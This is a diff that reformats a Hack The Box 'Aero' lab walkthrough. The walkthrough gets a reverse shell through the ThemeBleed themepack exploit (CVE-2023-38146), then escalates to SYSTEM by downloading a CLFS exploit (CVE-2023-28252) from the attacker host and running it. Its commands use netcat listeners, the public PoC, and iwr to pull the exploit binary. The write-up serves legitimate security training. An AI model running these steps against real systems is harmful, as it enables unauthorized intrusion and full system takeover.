@@ -23,13 +23,11 @@ showToc: true
 TocOpen: false
 ---
 
-## Box Info
-
-| | |
-|---|---|
-| **OS** | Windows |
-| **Difficulty** | Medium |
-| **Release** | 2023 |
+| Field      | Info    |
+|------------|---------|
+| OS         | Windows |
+| Difficulty | Medium  |
+| Release    | 2023    |
 
 Aero is a medium Windows box from Hack The Box. The target runs IIS hosting "Aero Theme Hub", a Windows 11 theme repository with a file upload feature. The site accepts `.themepack` files, which opens the door to CVE-2023-38146 (ThemeBleed), a vulnerability in how Windows handles `.theme` files that reference version 999 style resources. Uploading a malicious themepack gets code execution as sam.emerson. From there, a hint in the user's documents points toward CVE-2023-28252, a privilege escalation in the Windows Common Log File System (CLFS) driver that gives SYSTEM.
 
@@ -45,12 +43,15 @@ Aero is a medium Windows box from Hack The Box. The target runs IIS hosting "Aer
 | 6 | Compile CLFS exploit with reverse shell payload | `clfs_eop.exe` |
 | 7 | Transfer and execute on target | Shell as SYSTEM |
 
+---
+
 ## Recon
 
 ### nmap
 
 Starting with a service scan on the open port:
 
+**Kali:**
 ```console
 $ nmap -p 80 -sCV 10.129.229.128
 PORT   STATE SERVICE VERSION
@@ -80,12 +81,15 @@ The site also has a file upload form for submitting custom themes. That's our de
 
 ![Theme upload form with Choose File button](/images/htb-aero/theme-upload-form.png)
 
+---
+
 ## Shell as sam.emerson
 
 ### ThemeBleed (CVE-2023-38146)
 
 First, clone the PoC and set it up:
 
+**Kali:**
 ```console
 $ git clone https://github.com/Jnnshschl/CVE-2023-38146.git
 $ cd CVE-2023-38146
@@ -96,12 +100,14 @@ $ pip install -r requirements.txt
 
 Start a netcat listener:
 
+**Kali:**
 ```console
 $ rlwrap nc -lvnp 9001
 ```
 
 Then run the exploit. It generates a malicious theme file, compiles a DLL payload, and starts an SMB server to serve it:
 
+**Kali:**
 ```console
 $ sudo $(which python3) themebleed.py -r 10.10.15.229 -p 9001
 2026-04-09 17:37:32,131 INFO> ThemeBleed CVE-2023-38146 PoC
@@ -126,6 +132,7 @@ We're in as `aero\sam.emerson`.
 
 ### user.txt
 
+**Target (sam.emerson):**
 ```console
 PS> cat user.txt
 8e12dd47************************
@@ -133,11 +140,21 @@ PS> cat user.txt
 
 ![user.txt flag on sam.emerson's desktop](/images/htb-aero/user-flag.png)
 
+---
+
 ## Shell as SYSTEM
 
 ### Enumeration
 
 Poking around sam.emerson's home directory, there's something interesting in the Documents folder:
+
+**Target (sam.emerson):**
+```console
+PS> dir
+...[snip]...
+CVE-2023-28252_Summary.pdf
+watchdog.ps1
+```
 
 ![Directory listing showing CVE-2023-28252_Summary.pdf and watchdog.ps1](/images/htb-aero/sam-emerson-documents.png)
 
@@ -179,26 +196,30 @@ Build with Ctrl+Shift+B. It compiles successfully.
 
 ### Exploitation
 
-Transfer the compiled exploit to the target. On my Kali box, start an HTTP server:
+Transfer the compiled exploit to the target. On Kali, start an HTTP server:
 
+**Kali:**
 ```console
 $ python3 -m http.server
 ```
 
 Then on the target, download it:
 
+**Target (sam.emerson):**
 ```console
 PS> iwr http://10.10.15.229:8000/clfs_eop.exe -outfile clfs_eop.exe
 ```
 
 Start a new listener on Kali:
 
+**Kali:**
 ```console
 $ rlwrap nc -lvnp 9002
 ```
 
 And run the exploit on the target:
 
+**Target (sam.emerson):**
 ```console
 PS> .\clfs_eop.exe
 ```
@@ -211,6 +232,7 @@ We're SYSTEM.
 
 ### root.txt
 
+**Target (SYSTEM):**
 ```console
 PS> cat root.txt
 7a896840************************
